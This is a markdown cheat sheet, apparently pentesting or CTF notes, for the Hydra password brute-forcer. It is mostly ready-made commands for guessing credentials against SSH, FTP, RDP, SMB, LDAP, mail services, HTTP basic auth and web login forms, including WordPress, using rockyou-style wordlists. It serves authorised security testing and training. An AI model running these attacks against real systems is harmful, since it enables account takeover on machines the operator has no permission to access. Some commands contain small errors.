# Hydra User Guide

* https://github.com/vanhauser-thc/thc-hydra

## Hydra Syntax

* The correct hydra syntax is depended upon the service you are going after. For example if we want to hit ftp we should use:

## FTP

```
hydra -l user -P passlist.txt ftp://10.10.10.10 -F
```

## SSH

```
hydra -l <username> -P /usr/share/wordlists/rockyou.txt 10.10.10.10. -t 4 ssh
```

* `-l` is to specify the username
* `P` is to specify a password list
* `-t` is to specify the number of threads to run hydra with.
* Note: Hydra recommends no more than 4 threads, however you can run it faster with `-t 16`.
* `-F` means stop when you find your first valid password, highly recommend this option

```
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://$host -f
hydra -l admin -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt ssh://$host -f -s 2222
hydra -L user.txt -P password.txt -f ssh://10.10.15.2:31294 -t 4 -w 15 -F 
```

## POST Web Form

* Hydra can be used to brute force web logins as well.
* Step 1: Determine the request made to the form (POST/GET)
* Identify this in the network tab (developer tools), view the source code, or use Burp Suite.
* Syntax:

```
hydra -l <username> -P /usr/share/wordlists/rockyou.txt 10.10.211.150 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -vV
```

* `http-post-form` specifies the type of form
* `/login url` the login page URL i.e. `http://dont-brute-force-me.com/login.php`
* `:username` the form field name for the username
* `^USER^` this tells hydra to use the username you specified
* `password` the form field name for the password
* `^PASS^` the password list specified in the command
* `Login` the failed login message
* `Login failed` is the login failure message that the form specifies
* `F=inncorrect` the word that appears on the page if the login fails
* `-vV` specifies very verbose output
* Hydra non default ssh port:

```
hydra -t 16 -l sam -P /usr/share/wordlists/rockyou.txt 10.10.80.187 ssh -s 4567 -vV
```

### HTTP-GET

* Basic Authentication HTTP-GET

```
hydra -vV -l administrator -P 2023-200_most_used_passwords.txt 10.13.38.11 http-get /admin/ 
hydra -vV -t 2 -l administrator -P /usr/share/seclists/Passwords/seasons.txt 10.13.38.11 http-get /admin/
```

## Example Syntax

```
#Hydra brute force against SNMP
hydra -P password-file.txt -v $ip snmp	
#Hydra FTP known user and rockyou password list
hydra -t 1 -l admin -P /usr/share/wordlists/rockyou.txt -vV $ip ftp	
#Hydra SSH using list of users and passwords
hydra -v -V -u -L users.txt -P passwords.txt -t 1 -u $ip ssh	
#Hydra SSH using a known password and a username list
hydra -v -V -u -L users.txt -p "" -t 1 -u $ip ssh
#Hydra SSH Against Known username on port 22
hydra $ip -s 22 ssh -l -P big_wordlist.txt	
#Hydra POP3 Brute Force
hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f $ip pop3 -V	
#Hydra SMTP Brute Force
hydra -P /usr/share/wordlistsnmap.lst $ip smtp -V	
#Hydra attack http get 401 login with a dictionary
hydra -L ./webapp.txt -P ./webapp.txt $ip http-get /admin	
#Hydra attack Windows Remote Desktop with rockyou
hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt rdp://$ip	
#Hydra brute force SMB user with rockyou
hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt $ip smb	
#Hydra brute force a Wordpress admin
hydra -l admin -P ./passwordlist.txt $ip -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'	 login
#SMB Brute Forcing
hydra -L usernames.txt -P passwords.txt $ip smb -V -f	
#LDAP Brute Forcing
hydra -L users.txt -P passwords.txt $ip ldap2 -V -f	
```

## Additional Syntax Formats

```
sudo hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.43 http-post-form "/department/login.php:username=admin&password=^PASS^:Invalid Password!"
sudo hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.211.150 http-post-form "/login:username=molly&password=^PASS^:F=incorrect" -V
sudo hydra 10.0.0.1 http-post-form "/admin.php:target=auth&mode=login&user=^USER^&password=^PASS^:invalid" -P /usr/share/wordlists/rockyou.txt -l admin
hydra -l lazie -P /opt/rockyou.txt imap://10.10.251.142 -vV
```
